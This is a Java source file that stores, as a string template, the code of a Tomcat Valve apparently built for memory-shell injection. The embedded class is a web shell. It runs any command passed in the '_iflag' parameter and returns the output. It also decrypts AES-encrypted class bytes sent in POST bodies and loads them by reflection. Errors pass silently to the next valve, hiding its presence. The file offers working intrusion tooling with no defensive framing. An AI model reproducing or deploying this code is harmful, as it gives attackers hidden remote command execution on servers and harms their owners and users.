package com.Classes;

public class valveImplStr {
    public static String className="Valveimpl";
    public static String valveimpl="import org.apache.catalina.connector.Request;\n" +
            "import org.apache.catalina.connector.Response;\n" +
            "import org.apache.catalina.valves.ValveBase;\n" +
            "\n" +
            "import javax.crypto.Cipher;\n" +
            "import javax.crypto.spec.SecretKeySpec;\n" +
            "import javax.servlet.ServletException;\n" +
            "import javax.servlet.http.HttpSession;\n" +
            "import java.io.ByteArrayOutputStream;\n" +
            "import java.io.IOException;\n" +
            "import java.io.InputStream;\n" +
            "import java.lang.reflect.Method;\n" +
            "import java.util.HashMap;\n" +
            "\n" +
            "public class Valveimpl extends ValveBase {\n" +
            "\n" +
            "    public Valveimpl() {\n" +
            "    }\n" +
            "\n" +
            "    @Override\n" +
            "    public void invoke(Request request, Response response) throws IOException, ServletException {\n" +
            "        try {\n" +
            "            String cmd = request.getParameter(\"_iflag\");\n" +
            "            if (cmd != null && !cmd.equals(\"\")) {\n" +
            "                if (request.getMethod().equals(\"POST\")) {\n" +
            "                    try {\n" +
            "                        String k = \"%s\";\n" +
            "                        HttpSession session = request.getSession();\n" +
            "                        session.putValue(\"u\", k);\n" +
            "                        Cipher c = Cipher.getInstance(\"AES\");\n" +
            "                        c.init(2, new SecretKeySpec(k.getBytes(), \"AES\"));\n" +
            "                        HashMap hashMap = new HashMap();\n" +
            "                        hashMap.put(\"request\", request);\n" +
            "                        hashMap.put(\"response\", response);\n" +
            "                        hashMap.put(\"session\", session);\n" +
            "                        ClassLoader clzLoader = Thread.currentThread().getContextClassLoader();\n" +
            "                        Class<?> aClass = clzLoader.loadClass(\"java.lang.ClassLoader\");\n" +
            "                        Method defineClass = aClass.getDeclaredMethod(\"defineClass\", byte[].class, int.class, int.class);\n" +
            "                        defineClass.setAccessible(true);\n" +
            "                        byte[] decode = c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()));\n" +
            "                        Class lisi = (Class) defineClass.invoke(clzLoader, decode, 0, decode.length);\n" +
            "                        lisi.newInstance().equals(hashMap);\n" +
            "                    } catch (Exception e) {\n" +
            "                        getNext().invoke(request, response);\n" +
            "                    }\n" +
            "                } else {\n" +
            "                    InputStream in = Runtime.getRuntime().exec(cmd.trim().split(\" \")).getInputStream();\n" +
            "                    ByteArrayOutputStream os = new ByteArrayOutputStream();\n" +
            "                    byte[] bytes = new byte[1024];\n" +
            "                    int a = -1;\n" +
            "                    while ((a = in.read(bytes)) != -1) {\n" +
            "                        os.write(bytes, 0, a);\n" +
            "                    }\n" +
            "                    response.getWriter().println(new String(os.toByteArray()));\n" +
            "                }\n" +
            "            } else {\n" +
            "                getNext().invoke(request, response);\n" +
            "            }\n" +
            "        } catch (Exception e) {\n" +
            "            getNext().invoke(request, response);\n" +
            "        }\n" +
            "    }\n" +
            "}";
}
